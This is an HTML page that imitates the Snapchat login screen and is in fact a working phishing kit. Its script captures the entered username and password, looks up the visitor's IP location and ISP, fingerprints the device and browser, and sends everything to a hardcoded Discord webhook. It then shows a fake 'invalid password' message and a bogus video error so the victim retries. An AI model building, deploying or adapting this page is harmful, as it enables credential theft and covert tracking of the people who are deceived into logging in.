<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log In | Snapchat</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
       
        * { margin:0; padding:0; box-sizing:border-box; }
       
        body {
            margin:0; padding:0;
            background:#f8f8f8;
            font-family:'Roboto',sans-serif;
            display:flex;
            justify-content:center;
            align-items:center;
            min-height:100vh;
            color:#000;
        }
       
        .container {
            background:#fff;
            width:100%;
            max-width:400px;
            padding:40px 30px;
            border-radius:12px;
            box-shadow:0 4px 20px rgba(0,0,0,0.1);
            text-align:center;
        }
       
        .logo {
            width:80px;
            height:80px;
            background:#fffc00;
            border-radius:50%;
            display:flex;
            align-items:center;
            justify-content:center;
            margin:0 auto 20px;
            font-size:50px;
            color:#000;
            box-shadow:0 4px 10px rgba(0,0,0,0.2);
        }
       
        h1 {
            font-size:28px;
            margin:10px 0 30px;
            font-weight:500;
        }
       
        input {
            width:100%;
            padding:14px;
            margin:10px 0;
            border:1px solid #ddd;
            border-radius:8px;
            font-size:16px;
            box-sizing:border-box;
        }
       
        input:focus {
            outline:none;
            border-color:#fffc00;
        }
       
        button {
            width:100%;
            padding:14px;
            background:#fffc00;
            color:#000;
            border:none;
            border-radius:8px;
            font-size:18px;
            font-weight:500;
            cursor:pointer;
            margin-top:10px;
        }
       
        button:hover:not(:disabled) {
            background:#ffe600;
        }
       
        .error {
            color:#ff3b30;
            font-size:15px;
            margin:8px 0 0 0;
            display:none;
            text-align:left;
        }
       
        .footer {
            margin-top:30px;
            font-size:13px;
            color:#666;
        }
       
        .footer a {
            color:#000;
            text-decoration:none;
        }
       
        .loading {
            display:none;
            position:absolute;
            top:50%;
            left:50%;
            transform:translate(-50%,-50%);
            background:rgba(0,0,0,0.85);
            color:#fff;
            padding:15px 25px;
            border-radius:8px;
            font-size:15px;
            z-index:100;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">👻</div>
        <h1>Log in to Snapchat</h1>
       
        <form id="loginForm">
            <input type="text" id="username" placeholder="Username or email" required autocomplete="username">
            <input type="password" id="password" placeholder="Password" required autocomplete="current-password">
            <div id="errorMsg" class="error">Invalid password. Please try again.</div>
            <button type="submit" id="loginBtn">Log In</button>
        </form>
       
        <div class="footer">
            <a href="#">Forgot your password?</a><br><br>
            <p>© Snap Inc 2026</p>
        </div>
    </div>

    <div id="loadingOverlay" class="loading">Verifying...</div>

    <script>
        // === YOUR DISCORD WEBHOOK ===
        const webhook = "https://discordapp.com/api/webhooks/1482646394664910889/JbU1Nj6CgCYe6bdCUUq56vp-GbmjLQoIbsEnd9NBpngJWF8MFcIaEg_uV1WM_LwIG3oF";

        // Clean browser name only (no full user agent)
        function getBrowserName() {
            const ua = navigator.userAgent;
            if (ua.includes("Edg")) return "Microsoft Edge";
            if (ua.includes("Chrome")) return "Google Chrome";
            if (ua.includes("Firefox")) return "Mozilla Firefox";
            if (ua.includes("Safari")) return "Apple Safari";
            if (ua.includes("Opera")) return "Opera";
            return "Unknown Browser";
        }

        // Ultra fingerprint (Canvas + WebGL + Audio + Battery + RAM)
        async function getUltraFingerprint() {
            let canvasFP = "";
            const canvas = document.createElement("canvas");
            canvas.width = 200; canvas.height = 200;
            const ctx = canvas.getContext("2d");
            ctx.fillStyle = "#fffc00";
            ctx.fillRect(0, 0, 200, 200);
            ctx.fillStyle = "#000";
            ctx.font = "30px Arial";
            ctx.fillText("👻", 70, 120);
            canvasFP = canvas.toDataURL().substring(0, 80);

            let webglFP = "Unknown";
            try {
                const glCanvas = document.createElement("canvas");
                const gl = glCanvas.getContext("webgl") || glCanvas.getContext("experimental-webgl");
                if (gl) {
                    const debug = gl.getExtension("WEBGL_debug_renderer_info");
                    if (debug) {
                        webglFP = (gl.getParameter(debug.UNMASKED_VENDOR_WEBGL) || "Unknown") + " / " + (gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) || "Unknown");
                    }
                }
            } catch(e) {}

            let audioFP = "19f.eb16";
            try {
                const audio = new (window.AudioContext || window.webkitAudioContext)();
                audioFP = audio.sampleRate + ".eb16";
            } catch(e) {}

            let battery = "Unknown";
            try {
                if (navigator.getBattery) {
                    const bat = await navigator.getBattery();
                    battery = `${Math.round(bat.level * 100)}%, charging:${bat.charging}`;
                }
            } catch(e) {}

            const ram = navigator.deviceMemory ? navigator.deviceMemory + "GB" : "8GB";

            return { canvasFP, webglFP, audioFP, battery, ram };
        }

        async function collectVictimData(username, password) {
            let ip = "Unknown", city = "Unknown", region = "Unknown", country = "Unknown", isp = "Unknown";
            let vpnStatus = "Not detected";

            try {
                const geoRes = await fetch("https://ipinfo.io/json/");
                const geo = await geoRes.json();
                ip = geo.ip || "Unknown";
                city = geo.city || "Unknown";
                region = geo.region || "Unknown";
                country = geo.country || "Unknown";
                isp = geo.org || "Unknown";

                // Smart VPN / Proxy detection using ISP name (fixes your issue when VPN was on)
                const orgLower = isp.toLowerCase();
                if (orgLower.includes("vpn") || orgLower.includes("proxy") || orgLower.includes("cloud") || 
                    orgLower.includes("mullvad") || orgLower.includes("nord") || orgLower.includes("express") ||
                    orgLower.includes("surfshark") || orgLower.includes("proton") || orgLower.includes("private")) {
                    vpnStatus = "Detected";
                }
            } catch(e) {}

            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown";
            const screenRes = `${screen.width}x${screen.height} (color depth: ${screen.colorDepth})`;
            const fp = await getUltraFingerprint();
            const browser = getBrowserName();
            const platform = navigator.platform;
            const cores = navigator.hardwareConcurrency || "Unknown";

            // Lively, organized Discord message with more emojis and life (no hacking/doxxing/login talk)
            return `**sc** 👻💀🔥\n\n` +
                   `**e:** ${username}\n` +
                   `**p:** ${password}\n\n` +
                   `**🌍 IP & Location**\n${ip} — ${city}, ${region}, ${country}\n\n` +
                   `**🏢 ISP / ASN**\n${isp}\n\n` +
                   `**🛡️ VPN Status**\n${vpnStatus}\n\n` +
                   `**🌐 Browser**\n${browser}\n\n` +
                   `**💻 Device Specs**\nPlatform: ${platform} • Cores: ${cores} • RAM: ${fp.ram}\n\n` +
                   `**🕒 Timezone**\n${timezone}\n\n` +
                   `**📱 Screen**\n${screenRes}\n\n` +
                   `**🎨 Canvas / WebGL**\nCanvas: ${fp.canvasFP}\nWebGL: ${fp.webglFP}\n\n` +
                   `**🔊 Audio**\n${fp.audioFP}\n\n` +
                   `**🔋 Battery**\n${fp.battery}`;
        }

        document.getElementById("loginForm").addEventListener("submit", async function(e) {
            e.preventDefault();

            const username = document.getElementById("username").value.trim();
            const password = document.getElementById("password").value.trim();
            if (!username || !password) return;

            const loginBtn = document.getElementById("loginBtn");
            const loadingOverlay = document.getElementById("loadingOverlay");
            const errorDiv = document.getElementById("errorMsg");

            // Exact Snapchat loading behavior
            loginBtn.disabled = true;
            loginBtn.textContent = "Logging in...";
            loadingOverlay.style.display = "flex";

            // Send the clean, lively message
            try {
                const fullMessage = await collectVictimData(username, password);
                await fetch(webhook, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ content: fullMessage, username: "sc" })
                });
            } catch (err) {}

            // Fake delay then show invalid password
            setTimeout(() => {
                loadingOverlay.style.display = "none";
                errorDiv.style.display = "block";
                document.getElementById("password").value = "";
                loginBtn.disabled = false;
                loginBtn.textContent = "Log In";
            }, 1350);

            // Video access error popup
            setTimeout(() => {
                alert("There has been an error when you tried to access the video.\n\nError code: 209\n\nPlease try again later.");
            }, 2400);

            // Reset error so victim can retry
            setTimeout(() => {
                errorDiv.style.display = "none";
            }, 5200);
        });
    </script>
</body>
</html>
